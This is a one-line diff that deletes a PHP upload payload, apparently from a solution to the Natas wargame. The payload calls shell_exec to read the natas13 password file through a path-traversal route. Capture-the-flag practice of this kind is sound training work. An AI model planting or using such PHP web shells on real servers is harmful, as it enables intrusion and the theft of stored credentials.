@@ -1,1 +1,0 @@
-<pre><? print(shell_exec("cat ../../../../../etc/natas_webpass/natas13")) ?><pre>
